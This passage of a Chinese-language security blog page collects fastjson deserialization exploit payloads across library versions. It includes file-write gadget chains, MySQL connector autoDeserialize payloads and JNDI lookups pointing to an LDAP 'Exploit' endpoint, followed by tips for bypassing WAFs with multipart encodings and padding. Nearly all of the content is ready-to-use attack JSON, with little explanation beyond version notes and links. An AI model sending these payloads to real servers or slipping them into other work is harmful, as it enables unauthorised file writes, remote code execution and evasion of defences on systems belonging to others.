class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;targetPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;D:/wamp64/www/hacked.txt&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;tempPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;D:/wamp64/www/test.txt&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;writer&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.esotericsoftware.kryo.io.Output&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;buffer&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cHduZWQ=&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;outputStream&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.stream&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;position&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">5</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;close&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sleepycat.bind.serial.SerialOutput&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;out&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.writer&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>写文件</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  &#x27;stream&#x27;<span class="hljs-punctuation">:</span><br>  <span class="hljs-punctuation">&#123;</span><br>  &#x27;@type&#x27;<span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>  &#x27;@type&#x27;<span class="hljs-punctuation">:</span>&#x27;java.io.FileOutputStream&#x27;<span class="hljs-punctuation">,</span><br>  &#x27;file&#x27;<span class="hljs-punctuation">:</span>&#x27;/tmp/nonexist&#x27;<span class="hljs-punctuation">,</span><br>  &#x27;append&#x27;<span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">false</span></span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>&#x27;writer&#x27;<span class="hljs-punctuation">:</span><br><span class="hljs-punctuation">&#123;</span><br>  &#x27;@type&#x27;<span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>  &#x27;@type&#x27;<span class="hljs-punctuation">:</span>&#x27;org.apache.solr.common.util.FastOutputStream&#x27;<span class="hljs-punctuation">,</span><br>  &#x27;tempBuffer&#x27;<span class="hljs-punctuation">:</span>&#x27;SSBqdXN0IHdhbnQgdG8gcHJvdmUgdGhhdCBJIGNhbiBkbyBpdC4=&#x27;<span class="hljs-punctuation">,</span><br>  &#x27;sink&#x27;<span class="hljs-punctuation">:</span><br>  <span class="hljs-punctuation">&#123;</span><br>  &#x27;$ref&#x27;<span class="hljs-punctuation">:</span>&#x27;$.stream&#x27;<br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>&#x27;start&#x27;<span class="hljs-punctuation">:</span><span class="hljs-number">38</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>&#x27;close&#x27;<span class="hljs-punctuation">:</span><br><span class="hljs-punctuation">&#123;</span><br>  &#x27;@type&#x27;<span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>  &#x27;@type&#x27;<span class="hljs-punctuation">:</span>&#x27;org.iq80.snappy.SnappyOutputStream&#x27;<span class="hljs-punctuation">,</span><br>  &#x27;out&#x27;<span class="hljs-punctuation">:</span><br>  <span class="hljs-punctuation">&#123;</span><br>  &#x27;$ref&#x27;<span class="hljs-punctuation">:</span>&#x27;$.writer&#x27;<br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>适用于jdk8&#x2F;10的</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;sun.rmi.server.MarshalOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;out&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.util.zip.InflaterOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;out&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.io.FileOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;file&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;dst&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;append&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;false&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;infl&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;input&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;bufLen&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1048576</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;protocolVersion&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>jdk 8</p><ul><li>position写入的长度，必须和base64编码前的长度一致。<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;stream&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;targetPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;f:/pwn.txt&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;tempPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;writer&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.esotericsoftware.kryo.io.Output&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;buffer&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;YjF1M3I=&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;outputStream&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.stream&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;position&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">5</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;close&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sleepycat.bind.serial.SerialOutput&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;out&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.writer&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure></li></ul><p>写文件,来自@W.K修改</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs json"><br><span class="hljs-comment">//fastjson&lt;=1.2.68 commons-io 2.0-2.6 commons-io ⼤于2.6时改⼏个参数名就⾏了</span><br><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;x&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;input&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;reader&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;jdk.nashorn.api.scripting.URLReader&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;http://127.0.0.1:8083/test.txt&quot;</span><br>      <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;charsetName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;bufferSize&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">10000</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;branch&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;writer&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;file&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/tmp/files/12345&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;encoding&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;append&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>      <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;charset&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;bufferSize&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">8193</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;writeImmediately&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;trigger&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;is&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;input&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.input&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;branch&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.branch&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;closeBranch&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>      <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;httpContentType&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;text/xml&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;lenient&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;defaultEncoding&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;UTF-8&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>2021黑帽大会腾讯玄武披露<br>详细漏洞原理待研究<br><a href="https://b1ue.cn/archives/506.html">https://b1ue.cn/archives/506.html</a></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json">Mysqlconnector <span class="hljs-number">5.1</span>.x<br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;hostToConnectTo&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;mysql.host&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;portToConnectTo&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">3306</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;info&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;user&quot;</span><span class="hljs-punctuation">:</span>”user<span class="hljs-string">&quot;,&quot;</span>password<span class="hljs-string">&quot;:&quot;</span>pass<span class="hljs-string">&quot;,&quot;</span>statementInterceptors<span class="hljs-string">&quot;:&quot;</span>com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor<span class="hljs-string">&quot;,&quot;</span>autoDeserialize<span class="hljs-string">&quot;:&quot;</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-string">&quot;,&quot;</span>NUM_HOSTS<span class="hljs-string">&quot;: &quot;</span><span class="hljs-number">1</span><span class="hljs-string">&quot;&#125;,&quot;</span>databaseToConnectTo<span class="hljs-string">&quot;:&quot;</span>dbname<span class="hljs-string">&quot;,&quot;</span>url<span class="hljs-string">&quot;:&quot;</span><span class="hljs-string">&quot;&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">  Mysqlconnector 6.0.2 or 6.0.3</span><br><span class="hljs-string">  &#123;&quot;</span>@type<span class="hljs-string">&quot;: &quot;</span>java.lang.AutoCloseable<span class="hljs-string">&quot;,&quot;</span>@type<span class="hljs-string">&quot;: &quot;</span>com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection<span class="hljs-string">&quot;,&quot;</span>proxy<span class="hljs-string">&quot;:&#123;&quot;</span>connectionString<span class="hljs-string">&quot;:&#123;&quot;</span>url<span class="hljs-string">&quot;: &quot;</span>jdbc<span class="hljs-punctuation">:</span>mysql<span class="hljs-punctuation">:</span><span class="hljs-comment">//localhost:3306/foo?allowLoadLocalInfile=true&quot;&#125;&#125;&#125;</span><br><br>Mysqlconnector <span class="hljs-number">6.</span>x or &lt; <span class="hljs-number">8.0</span><span class="hljs-number">.20</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.mysql.cj.jdbc.ha.ReplicationMySQLConnection&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;proxy&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;connectionUrl&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.mysql.cj.conf.url.ReplicationConnectionUrl&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;masters&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;host&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;mysql.host&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;slaves&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;properties&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;host&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;mysql.host&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;user&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;user&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dbname&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;dbname&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;pass&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;queryInterceptors&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;autoDeserialize&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;true&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="fastjson-3"><a href="#fastjson-3" class="headerlink" title="fastjson&lt;&#x3D;1.2.68"></a>fastjson&lt;&#x3D;1.2.68</h3><h3 id="fastjson-未知版本"><a href="#fastjson-未知版本" class="headerlink" title="fastjson 未知版本"></a>fastjson 未知版本</h3><p>待探索</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;tmJndiName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;tmFromJndi&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;transactionManager&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.transactionManager&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;tmJndiName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;tmFromJndi&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;transactionManager&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.transactionManager&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="fastjson-1-2-83"><a href="#fastjson-1-2-83" class="headerlink" title="fastjson &lt; 1.2.83"></a>fastjson &lt; 1.2.83</h3><ul><li>具体版本1.2.76 &lt;&#x3D; fastjson &lt; 1.2.83</li><li>依赖groovy</li></ul><p>具体参考<br><a href="https://github.com/Lonely-night/fastjsonVul">https://github.com/Lonely-night/fastjsonVul</a></p><h2 id="bypasswaf"><a href="#bypasswaf" class="headerlink" title="bypasswaf"></a>bypasswaf</h2><p>绕过 WAF ，在部分中间件中，multipart 支持指定 Content-Transformer-Encoding<br>可以使用 Base64 或 quoted-printable （QP 编码） 来绕过 WAF<br>大量字符绕过 WAF</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">[</span><span class="hljs-number">11111111111111111111111111111111111</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">[</span><span class="hljs-number">11111111111111111111111111111111111.</span>.. <span class="hljs-punctuation">,</span><span class="hljs-punctuation">[</span><span class="hljs-number">11111111111111111111111111111111111.</span>.. <span class="hljs-punctuation">,</span><span class="hljs-punctuation">[</span><span class="hljs-number">11111111111111111111111111111111111.</span>.. <span class="hljs-punctuation">,</span><span class="hljs-punctuation">[</span><span class="hljs-number">11111111111111111111111111111111111.</span>.. <span class="hljs-punctuation">,</span>...<span class="hljs-punctuation">,</span><span 